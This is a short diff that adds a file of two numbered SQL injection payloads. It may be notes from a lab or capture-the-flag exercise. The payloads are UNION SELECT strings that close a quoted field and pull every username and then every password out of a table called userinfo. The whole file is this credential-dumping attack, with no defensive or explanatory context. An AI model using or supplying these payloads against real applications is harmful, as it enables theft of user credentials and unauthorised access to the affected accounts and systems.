@@ -1,0 +1,5 @@
+1) Get all of the usernames
+' UNION SELECT Username FROM userinfo WHERE ''='
+
+2) Get all of the passwords
+' UNION SELECT Password FROM userinfo WHERE ''='
